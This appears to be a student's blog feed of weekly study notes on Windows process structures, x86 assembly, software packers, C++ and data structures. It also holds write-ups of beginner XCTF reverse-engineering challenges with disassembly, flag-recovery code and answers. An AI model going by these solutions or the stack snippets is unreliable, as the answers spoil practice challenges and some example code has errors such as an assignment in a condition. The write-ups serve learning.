singer[j][<span class="number">1</span>]+=<span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> j==k:</span><br><span class="line">        <span class="keyword">if</span> s!=singer[j][<span class="number">0</span>]:</span><br><span class="line">            k+=<span class="number">1</span></span><br><span class="line">            singer[k][<span class="number">0</span>]=s</span><br><span class="line">            singer[k][<span class="number">1</span>]+=<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            singer[j][<span class="number">1</span>]+=<span class="number">1</span></span><br><span class="line">    j+=<span class="number">1</span></span><br><span class="line">    i=i+<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(singer)</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>2020.04.27-2020.05.03</title>
    <url>/59200.html</url>
    <content><![CDATA[<h1>Windows内核基础</h1>
<h2 id="内核的数据结构">内核的数据结构</h2>
<h3 id="TEB">TEB</h3>
<p>TEB结构(Thread environment block,线程环境块)和PEB一样，是应用层中的结构。<br>
包含了系统频繁使用的一些与线程相关的数据，进程中每个线程（除系统线程）都有一个自己的TEB，一个进程的所有TEB都存放在从0x7FFDE000开始的线性内存中，每4KB为一个完整的TEB<br>
用WinDbg的本地调试功能可以查看系统中的TEB结构</p>
<span id="more"></span>
<h4 id="TEB访问">TEB访问</h4>
<p>可以通过NtCurrentTab函数调用和FS段寄存器访问两种方式访问TEB结构</p>
<ol>
<li>NtCurrentTab<br>
一个ntdll.dll中的函数，该函数可以返回当前线程TEB的地址</li>
<li>FS段寄存器<br>
当代码运行在r3时，fs指向的段的基地址即为当前线程的TEB</li>
</ol>
<h3 id="PEB">PEB</h3>
<p>PEB(Process Environment Block,进程环境块)存在于用户地址空间中，每个进程都有自己的PEB信息<br>
PEB结构的地址放在TEB中，因此可以通过fs：[偏移量]访问PEB的地址</p>
<h1>使用OD从零开始Cracking</h1>
<h2 id="汇编指令">汇编指令</h2>
<ol>
<li>nop</li>
<li>堆栈相关指令
<ol>
<li>push<br>
push[内存地址]<br>
push[eax]<br>
push 数值</li>
</ol>
<ul>
<li>ptr：防止两个操作数不一样。<br>
用byte/word/dword ptr指定内存单元的长度（字节、字、双字）</li>
</ul>
<ol start="2">
<li>pop</li>
<li>pushad<br>
按照eax、ecx、edx、ebx、esp、ebp、esi、edi的顺序把所有通用寄存器压入栈</li>
<li>popad<br>
把pushad入栈的值取出（顺序相反）</li>
<li>16位程序中有pusha、popa</li>
</ol>
</li>
<li>赋值指令
<ol>
<li>mov</li>
<li>movsx(操作有符号数)<br>
第一个操作数的位数比第二个操作数多，第二个填充第一个的前面几位<br>
填充的结果跟填充数字正负有关。用负数填充，结果的剩余部分填F；整数填充剩余部分填0。<br>
如：用F000填EAX，结果为FFFFF000；用1234填EAX，结果为00001234.<br>
(16位数的正数范围为0~7FFF，负数范围为8000~FFFF)</li>
<li>movzx（操作无符号数）<br>
与movsx相似，但剩余部分总填充0</li>
<li>LEA<br>
取地址指令，第一个操作数是通用寄存器，第二个是内存单元的地址（而不是值）<br>
如&quot;LEA EAX,DOWRD PTR DS:[ECX+38]&quot;不是获取内存中[ECX+38],而要计算ECX+38的值，并赋给EAX</li>
<li>XCHG<br>
交换两个操作数的值，寄存器/内存单元和寄存器</li>
</ol>
</li>
</ol>
<h2 id="数学指令">数学指令</h2>
<ol>
<li>inc dec</li>
<li>add sub</li>
<li>adc (带进位的加法)<br>
将两个操作数和进位标志（CF）的值相加放到第一个操作数中</li>
<li>SBB<br>
计算（第一个操作数-第二个操作数）再减去进位标志，将结果 存到第一个操作数中</li>
<li>MUL<br>
无符号数乘法。只有一个操作数，操作数和EAX相乘，结果放到EDX:EAX中</li>
<li>IMUL<br>
用于有符号数的乘法<br>
一个操作数时类似于MUL。<br>
当有两个操作数时，两者相乘，结果放到第一个操作数中<br>
当有三个操作数时，如，“IMUL EBP,DWORD PTR [ESI+74], FF800002”,意思是EBP=[ESI+74]*FF800002</li>
<li>DIV(无符号)/IDIV(有符号)<br>
DIV只有一个操作数，结果存放到EDX:EAX中<br>
IDIV：<br>
一个操作数时，于DIV相似<br>
两个操作数时，第一个除以第二个，结果存放到第一个操作数中<br>
三个操作数时，第二哥除以第一个，结果存放到第一个操作数中<br>
（与IMUL类似）</li>
<li>XADD(交换并相加)<br>
XCHG和ADD的组合，先将两个操作数交换数值，然后值相加赋给第一个操作数</li>
<li>NEG<br>
取反</li>
</ol>
<h2 id="逻辑指令">逻辑指令</h2>
<p>两个操作数，将两个操作数按位运算，并将结果存入第一个操作数中</p>
<ol>
<li>AND<br>
两个二进制位都为1，结果为1，此外都为0</li>
<li>OR<br>
有一位为1，结果就为1</li>
<li>XOR<br>
不同取1，相同取0</li>
<li>NOT<br>
取反（1-0，0-1）</li>
</ol>
<h1>两个攻防世界上的新手re题</h1>
<p>其实没看出来哪跟re有关了</p>
<h2 id="第一个">第一个</h2>
<p><span class="exturl" data-url="aHR0cHM6Ly9hZHdvcmxkLnhjdGYub3JnLmNuL3Rhc2svYW5zd2VyP3R5cGU9cmV2ZXJzZSZudW1iZXI9NCZncmFkZT0wJmlkPTUwNzYmcGFnZT0x">https://adworld.xctf.org.cn/task/answer?type=reverse&amp;number=4&amp;grade=0&amp;id=5076&amp;page=1<i class="fa fa-external-link-alt"></i></span></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">4</span>) &#123;</span><br><span class="line">    	<span class="built_in">printf</span>(<span class="string">&quot;what?\n&quot;</span>);</span><br><span class="line">    	<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> first = atoi(argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">if</span> (first != <span class="number">0xcafe</span>) &#123;</span><br><span class="line">    	<span class="built_in">printf</span>(<span class="string">&quot;you are wrong, sorry.\n&quot;</span>);</span><br><span class="line">    	<span class="built_in">exit</span>(<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> second = atoi(argv[<span class="number">2</span>]);</span><br><span class="line">    <span class="keyword">if</span> (second % <span class="number">5</span> == <span class="number">3</span> || second % <span class="number">17</span> != <span class="number">8</span>) &#123;</span><br><span class="line">    	<span class="built_in">printf</span>(<span class="string">&quot;ha, you won&#x27;t get it!\n&quot;</span>);</span><br><span class="line">    	<span class="built_in">exit</span>(<span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strcmp</span>(<span class="string">&quot;h4cky0u&quot;</span>, argv[<span class="number">3</span>])) &#123;</span><br><span class="line">    	<span class="built_in">printf</span>(<span class="string">&quot;so close, dude!\n&quot;</span>);</span><br><span class="line">    	<span class="built_in">exit</span>(<span class="number">4</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Brr wrrr grr\n&quot;</span>);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> hash = first * <span class="number">31337</span> + (second % <span class="number">17</span>) * <span class="number">11</span> + <span class="built_in">strlen</span>(argv[<span class="number">3</span>]) - <span class="number">1615810207</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Get your key: &quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%x\n&quot;</span>, hash);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>flag就是解出的hash值，没啥难度。（就是为了凑行数）</p>
<h2 id="第二个">第二个</h2>
<p><span class="exturl" data-url="aHR0cHM6Ly9hZHdvcmxkLnhjdGYub3JnLmNuL3Rhc2svYW5zd2VyP3R5cGU9cmV2ZXJzZSZudW1iZXI9NCZncmFkZT0wJmlkPTUwNzcmcGFnZT0x">https://adworld.xctf.org.cn/task/answer?type=reverse&amp;number=4&amp;grade=0&amp;id=5077&amp;page=1<i class="fa fa-external-link-alt"></i></span></p>
<p>就用16进制编辑器打开然后搜索“flag”</p>
<h1>写了个爬自己网易云红心歌单的爬虫</h1>
<p><a href="https://brubbish.github.io/53778.html">一个爬取自己网易云歌单的爬虫</a></p>
<p>其实还没写完</p>
]]></content>
      <tags>
        <tag>周报</tag>
        <tag>加密与解密</tag>
      </tags>
  </entry>
  <entry>
    <title>2020.05.04-2020.05.10</title>
    <url>/12483.html</url>
    <content><![CDATA[<h1>攻防世界新手题</h1>
<h2 id="RE">RE</h2>
<h3 id="insanity">insanity</h3>
<p><span class="exturl" data-url="aHR0cHM6Ly9hZHdvcmxkLnhjdGYub3JnLmNuL3Rhc2svYW5zd2VyP3R5cGU9cmV2ZXJzZSZudW1iZXI9NCZncmFkZT0wJmlkPTUwNzkmcGFnZT0x">https://adworld.xctf.org.cn/task/answer?type=reverse&amp;number=4&amp;grade=0&amp;id=5079&amp;page=1<i class="fa fa-external-link-alt"></i></span></p>
<p>原来flag还能长&quot;9447{This_is_a_flag}&quot;这样…</p>
<span id="more"></span>
<h3 id="logmein">logmein</h3>
<p><span class="exturl" data-url="aHR0cHM6Ly9hZHdvcmxkLnhjdGYub3JnLmNuL3Rhc2svYW5zd2VyP3R5cGU9cmV2ZXJzZSZudW1iZXI9NCZncmFkZT0wJmlkPTUwNzgmcGFnZT0x">https://adworld.xctf.org.cn/task/answer?type=reverse&amp;number=4&amp;grade=0&amp;id=5078&amp;page=1<i class="fa fa-external-link-alt"></i></span></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0000000000400707 loc_400707:                             ; CODE XREF: main+177↓j</span><br><span class="line">.text:0000000000400707                 lea     rdi, [rbp+s]    ; s</span><br><span class="line">.text:000000000040070B                 movsxd  rax, [rbp+var_54]</span><br><span class="line">.text:000000000040070F                 mov     [rbp+var_88], rax</span><br><span class="line">.text:0000000000400716                 call    _strlen</span><br><span class="line">.text:000000000040071B                 mov     rdi, [rbp+var_88]</span><br><span class="line">.text:0000000000400722                 cmp     rdi, rax</span><br><span class="line">.text:0000000000400725                 jnb     loc_4007AC</span><br><span class="line">.text:000000000040072B                 lea     rdi, [rbp+var_20] ; s</span><br><span class="line">.text:000000000040072F                 movsxd  rax, [rbp+var_54]</span><br><span class="line">.text:0000000000400733                 mov     [rbp+var_90], rax</span><br><span class="line">.text:000000000040073A                 call    _strlen</span><br><span class="line">.text:000000000040073F                 mov     rdi, [rbp+var_90]</span><br><span class="line">.text:0000000000400746                 cmp     rdi, rax</span><br><span class="line">.text:0000000000400749                 jb      loc_400754</span><br><span class="line">.text:000000000040074F                 call    sub_4007C0</span><br><span class="line">.text:0000000000400754 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0000000000400754</span><br><span class="line">.text:0000000000400754 loc_400754:                             ; CODE XREF: main+119↑j</span><br><span class="line">.text:0000000000400754                 movsxd  rax, [rbp+var_54]</span><br><span class="line">.text:0000000000400758                 mov     cl, [rbp+rax+var_20]</span><br><span class="line">.text:000000000040075C                 mov     [rbp+var_55], cl</span><br><span class="line">.text:000000000040075F                 mov     eax, [rbp+var_54]</span><br><span class="line">.text:0000000000400762                 cdq</span><br><span class="line">.text:0000000000400763                 idiv    [rbp+var_2C]</span><br><span class="line">.text:0000000000400766                 movsxd  rsi, edx</span><br><span class="line">.text:0000000000400769                 mov     cl, byte ptr [rbp+rsi+var_28]</span><br><span class="line">.text:000000000040076D                 mov     [rbp+var_56], cl</span><br><span class="line">.text:0000000000400770                 movsx   edx, [rbp+var_55]</span><br><span class="line">.text:0000000000400774                 movsx   edi, [rbp+var_56]</span><br><span class="line">.text:0000000000400778                 xor     edx, edi</span><br><span class="line">.text:000000000040077A                 mov     cl, dl</span><br><span class="line">.text:000000000040077C                 mov     [rbp+var_57], cl</span><br><span class="line">.text:000000000040077F                 movsxd  rsi, [rbp+var_54]</span><br><span class="line">.text:0000000000400783                 movsx   edx, [rbp+rsi+s]</span><br><span class="line">.text:0000000000400788                 movsx   edi, [rbp+var_57]</span><br><span class="line">.text:000000000040078C                 cmp     edx, edi</span><br><span class="line">.text:000000000040078E                 jz      loc_400799</span><br><span class="line">.text:0000000000400794                 call    sub_4007C0</span><br><span class="line">.text:0000000000400799 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0000000000400799</span><br><span class="line">.text:0000000000400799 loc_400799:                             ; CODE XREF: main+15E↑j</span><br><span class="line">.text:0000000000400799                 jmp     $+5</span><br><span class="line">.text:000000000040079E ; ---------------------------------------------------------------------------</span><br><span class="line">.text:000000000040079E</span><br><span class="line">.text:000000000040079E loc_40079E:                             ; CODE XREF: main:loc_400799↑j</span><br><span class="line">.text:000000000040079E                 mov     eax, [rbp+var_54]</span><br><span class="line">.text:00000000004007A1                 add     eax, 1</span><br><span class="line">.text:00000000004007A4                 mov     [rbp+var_54], eax</span><br><span class="line">.text:00000000004007A7                 jmp     loc_400707</span><br></pre></td></tr></table></figure>
<blockquote>
<p>ps:<br>
CQD:<br>
把edx的所有位设成eax最高位的值</p>
</blockquote>
<p>在最后的“jmp     loc_400707”实现循环<br>
跳转到sub_4007C0后，就显示输入的密码错误</p>
<p>由于不会分析了 就 看了伪代码</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">  v9 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">strcpy</span>(v8, <span class="string">&quot;:\&quot;AL_RT^L*.?+6/46&quot;</span>);</span><br><span class="line">  v7 = <span class="number">28537194573619560LL</span>;</span><br><span class="line">  v6 = <span class="number">7</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Welcome to the RC3 secure password guesser.\n&quot;</span>, a2, a3);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;To continue, you must enter the correct password.\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter your guess: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%32s&quot;</span>, s);</span><br><span class="line">  v3 = <span class="built_in">strlen</span>(s);</span><br><span class="line">  <span class="keyword">if</span> ( v3 &lt; <span class="built_in">strlen</span>(v8) )</span><br><span class="line">    sub_4007C0(v8);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(s); ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= <span class="built_in">strlen</span>(v8) )</span><br><span class="line">      ((<span class="keyword">void</span> (*)(<span class="keyword">void</span>))sub_4007C0)();</span><br><span class="line">    <span class="keyword">if</span> ( s[i] != (<span class="keyword">char</span>)(*((_BYTE *)&amp;v7 + i % v6) ^ v8[i]) )</span><br><span class="line">      ((<span class="keyword">void</span> (*)(<span class="keyword">void</span>))sub_4007C0)();</span><br><span class="line">  &#125;</span><br><span class="line">  sub_4007F0();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其中v7可以转换为16进制再转换成字符串，所以v7在运算时变为&quot;haramb&quot;<br>
得到flag的代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> k1[]=<span class="string">&quot;:\&quot;AL_RT^L*.?+6/46&quot;</span>;</span><br><span class="line">	<span class="keyword">char</span> k2[]=<span class="string">&quot;harambe&quot;</span>;</span><br><span class="line">	<span class="keyword">int</span> a=<span class="number">7</span>;</span><br><span class="line">	<span class="keyword">char</span> s[<span class="number">50</span>];</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="built_in">strlen</span>(k1);i++)&#123;</span><br><span class="line">		s[i]=(<span class="keyword">char</span>)(*(k2+i%a)^k1[i]);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">puts</span>(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="彦林学长给的一题">彦林学长给的一题</h3>
<p>题在这边：<span class="exturl" data-url="aHR0cHM6Ly96aGFuZ3NpLmxhbnpvdXMuY29tL2ljZnp4N2M=">easyYM<i class="fa fa-external-link-alt"></i></span><br>
看了他的wp<br>
嗯…感觉自己知道 有flag的那块地方没有被调用，但一方面是不知道是哪些函数跟flag有关（通过查看字符串）(后来用ida打开发现，放在main函数里，刚开始就跳过了） ，另外就是没有想到od设置某处为新eip的功能</p>
<h1>装Pwntools</h1>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt-get update</span><br><span class="line">apt-get install python2.7 python-pip python-dev git libssl-dev libffi-dev build-essential</span><br><span class="line">pip install --upgrade pip</span><br><span class="line">pip install pwntools -i https://pypi.tuna.tsinghua.edu.cn/simple/</span><br></pre></td></tr></table></figure>
<h1>数据结构</h1>
<h2 id="多重链表">多重链表</h2>
<ul>
<li>广义表<br>
广义表中的元素可以是一个单元素，也可以是另一个表。</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Glist</span>&#123;</span></span><br><span class="line">  <span class="keyword">int</span> tag;</span><br><span class="line">  <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">    Element Type Data;  <span class="comment">//用这个标志控制结点为单元素或者广义表</span></span><br><span class="line">    Glist anlist;</span><br><span class="line">  &#125;</span><br><span class="line">  Glist Next</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>广义表即为一个多重链表<br>
多重链表中结点的指针域有多个（如anlist和Next）,包含两个指针域的链表不一定是多重链表(如双向链表)</p>
<h2 id="堆栈">堆栈</h2>
<p>数据对象集：有穷线性表<br>
操作集：堆栈的长度、堆栈元素</p>
<ol>
<li>生成长度为MaxSize的空堆栈</li>
<li>判断堆栈是否满了</li>
<li>将一个元素压入堆栈</li>
<li>判断堆栈是否为空</li>
<li>删除并返回栈顶元素<br>
栈的顺序存储结构由一个<strong>一位数组</strong>和一个<strong>记录栈顶位置</strong>的变量top组成</li>
</ol>
<h3 id="顺序存储">顺序存储</h3>
<h4 id="入栈">入栈</h4>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(s-&gt;top==MaxSize<span class="number">-1</span>)&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;堆栈满&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">  s-&gt;data[s-&gt;top]=item;</span><br><span class="line">  (s-&gt;top)++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="出栈">出栈</h4>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(s-&gt;top=<span class="number">-1</span>)&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;堆栈空&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">  data=s-&gt;data[(s-&gt;top)--];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="链式存储">链式存储</h3>
<p>用一个单链表，称作链栈<br>
top在链表的头结点，头结点里不存放其他元素</p>
<h4 id="入栈-2">入栈</h4>
<p><img src="https://s1.ax1x.com/2020/05/08/Ynrdv6.png" alt="Ynrdv6.png"></p>
<h4 id="出栈-2">出栈</h4>
<p>记得free()<br>
<img src="https://s1.ax1x.com/2020/05/08/Ynr0KK.png" alt="Ynr0KK.png"></p>
<h2 id="队列">队列</h2>
<p>只能在一端插入（入队），在另一端删除（出队）<br>
先进先出</p>
<h3 id="顺序存储-2">顺序存储</h3>
<p>一个一维数组+一个记录头元素的变量front+一个记录尾元素的变量rear<br>
front指向第一个元素的前一个位置</p>
<ul>
<li>循环队列<br>
当front和rear相等时为空（或相等）（解决方案：加入一个额外标记；使用n-1个空间）</li>
</ul>
<p><img src="https://s1.ax1x.com/2020/05/08/YnrBDO.png" alt="YnrBDO.png"></p>
<h3 id="链式存储-2">链式存储</h3>
<p>存在单链表中，front和rear指针分别指向头和尾</p>
]]></content>
      <tags>
        <tag>周报</tag>
        <tag>数据结构</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>2020.05.18-2020.05.25</title>
    <url>/33337.html</url>
    <content><![CDATA[<p>从上周开始不用写周报了<br>
感觉没有监督就懒散了23333</p>
<h1>壳</h1>
<p>附加在原始程序上，通过windows加载器载入内存后，先于原始程序执行，在执行过程中对原始程序进行解密、还原，还原后把控制权还给原始程序，执行原来的代码。可以防止程序文件被非法修改或者静态反编译<br>
许多木马和病毒都喜欢用壳来保护和隐藏自己。对一些流行的壳，杀毒引擎先对目标软件进行脱壳，再进行病毒检查；对大多数私人壳，杀毒软件不会开发解压引擎，而是直接当成木马或病毒处理，因此，商业软件出于兼容性的考虑，很少使用加壳保护，而在其他方面提高软件保护强度<br>
不同的外壳侧重方面不一样，有的侧重压缩，有的侧重加密，还有一些提供额外的功能，如注册机制、使用次数、时间限制等</p>
<span id="more"></span>
<h2 id="压缩引擎">压缩引擎</h2>
<p>一些加壳软件调用现成的压缩引擎对文件进行压缩，在选择压缩引擎时要保证解压速度快，这样加了壳的文件运行速度才不会受到太大影响</p>
<h3 id="压缩壳">压缩壳</h3>
<ol>
<li>upx</li>
<li>ASPack</li>
</ol>
<h3 id="加密壳">加密壳</h3>
<ol>
<li>ASProtect</li>
<li>Armadillo</li>
<li>EXECryptor</li>
<li>Themida</li>
</ol>
<h1>虚拟机保护</h1>
<p>许多解释性的语言，如java的jvm。这里讨论的虚拟机（与vmware不同）将一系列指令解释成字节码后放在一个解释引擎中执行，从而对软件进行保护。</p>
<h2 id="虚拟机引擎">虚拟机引擎</h2>
<p>一个虚拟机引擎由编译器、解释器和虚拟cpu组成，还会搭配一个或多个指令系统。虚拟机在运行时，现根据自定义的指令系统把已知的指令解释成字节码并放在pe文件中，然后将原始代码删除，改成直接进入虚拟机执行。<br>
挑事者跟踪并进入虚拟机后很难理解原始指令。想要理解程序就必须对虚拟机引擎进行分析<br>
虚拟机技术以效率换取安全，一条指令经过虚拟机处理，体积会膨胀几十几百倍。因此，VM保护通常经过sdk方式，只把较为重要的代码保护起来</p>
<h1>c++</h1>
<h2 id="输入和输出">输入和输出</h2>
<p>可以用scanf和printf，也可用c++中增加的输入输出库<br>
如果要使用输入输出时，需要包含头文件：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br></pre></td></tr></table></figure>
<p>使用cin和count进行输入和输出</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> x;</span><br><span class="line">    cin&gt;&gt;x;<span class="comment">//多输出：cin&gt;&gt;x&gt;&gt;y;</span></span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;The int number is x= &quot;</span>&lt;&lt;x&lt;&lt;endl;</span><br><span class="line">    <span class="comment">//endl即end of line 表示结尾进行换行</span></span><br></pre></td></tr></table></figure>
<p>cin和count这两个运算符可以自行分析处理（强制转换）数据类型，因此无需像使用scanf和printf那样给出格式控制字符串。</p>
<h2 id="new和delete">new和delete</h2>
<p>用来动态分配内存和释放内存</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> *p = <span class="keyword">new</span> <span class="keyword">int</span>;  <span class="comment">//分配1个int型的内存空间</span></span><br><span class="line"><span class="keyword">delete</span> p;  <span class="comment">//释放内存</span></span><br><span class="line"><span class="comment">//以及</span></span><br><span class="line"><span class="keyword">int</span> *p = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">10</span>];  <span class="comment">//分配10个int型的内存空间</span></span><br><span class="line"><span class="keyword">delete</span>[] p;</span><br></pre></td></tr></table></figure>
<h2 id="类和对象">类和对象</h2>
<p>类只是一种数据类型，本身并不占用空间</p>
<h3 id="定义">定义</h3>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span>&#123;</span><span class="comment">//关键字class专门用来定义类，Student是类的名称，类名首字母一般大写</span></span><br><span class="line"><span class="keyword">public</span>:<span class="comment">//表示类的成员具有公开的访问权限，其他还有private等</span></span><br><span class="line">    <span class="comment">//成员变量</span></span><br><span class="line">    <span class="keyword">char</span> *name;</span><br><span class="line">    <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">float</span> score;</span><br><span class="line">    <span class="comment">//成员函数</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">say</span><span class="params">()</span></span>&#123;</span><br><span class="line">        cout&lt;&lt;name&lt;&lt;<span class="string">&quot;的年龄是&quot;</span>&lt;&lt;age&lt;&lt;<span class="string">&quot;，成绩是&quot;</span>&lt;&lt;score&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span> <span class="title">LLL</span>;</span><span class="comment">//创建对象 ，class可不要，LLL也可为数组</span></span><br><span class="line"><span class="comment">// 用.访问成员</span></span><br><span class="line"><span class="comment">//与结构体贼相似</span></span><br></pre></td></tr></table></figure>
<h3 id="对象指针">对象指针</h3>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//在栈上分配内存</span></span><br><span class="line">Student stu;</span><br><span class="line">Student *pStu = &amp;stu;</span><br><span class="line"></span><br><span class="line"><span class="comment">//在堆上分配内存</span></span><br><span class="line">Student *pStu = <span class="keyword">new</span> Student;</span><br><span class="line"><span class="comment">//访问时通过&quot;-&gt;&quot;</span></span><br></pre></td></tr></table></figure>
<h3 id="成员变量和成员函数">成员变量和成员函数</h3>
<p>在类中直接定义函数时，不需要在函数名前加类名；当成员函数定义在类外时，要在函数名前加类名</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span>&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">char</span> *name;</span><br><span class="line">    <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">float</span> score;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">say</span><span class="params">()</span></span>;  <span class="comment">//函数声明</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//函数定义</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Student::say</span><span class="params">()</span></span>&#123;<span class="comment">// 如果写成inline void Student::say 就为内联函数</span></span><br><span class="line">    <span class="comment">//::是域解析符（作用域运算符、作用域限定符）用来连接类名和函数名</span></span><br><span class="line">    cout&lt;&lt;name&lt;&lt;<span class="string">&quot;的年龄是&quot;</span>&lt;&lt;age&lt;&lt;<span class="string">&quot;，成绩是&quot;</span>&lt;&lt;score;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>在类体中定义的成员函数会自动成为内联函数，在类体外定义的不会</strong><br>
内联函数会将函数调用处用函数体代替，所以尽量在类内部作声明，在类外对函数定义</p>
<blockquote>
<p>函数调用是有时间和空间开销的。程序在执行一个函数之前需要将实参、局部变量、返回地址以及若干寄存器都压入栈中，然后才能执行函数体中的代码；执行完之后，还要将之前压入栈中的数据都出栈，才能接着执行函数调用位置以后的代码。<br>
如果函数体代码比较多，需要较长的执行时间，那么函数调用机制占用的时间可以忽略；如果函数只有一两句语句，那么大部分的时间都会花费在函数调用机制上，这种时间开销就不容忽视。<br>
为了消除函数调用的时空开销，C++在编译时将函数调用处用函数体替换，即内联函数。<br>
内联函数的缺点：编译后的程序会存在多份相同的函数拷贝。<br>
内联函数的代码在编译后就被消除了</p>
</blockquote>
<h3 id="类成员的访问权限和类的封装">类成员的访问权限和类的封装</h3>
<p>控制成员的访问权限：成员访问限定符public、protected、private<br>
在类的内部，成员可以互相访问；在类的外部，只能通过对象访问public属性的成员<br>
约定成员变量以*m_*开头，可以直接看出是成员变量，又可以和成员函数中的形参名字区分</p>
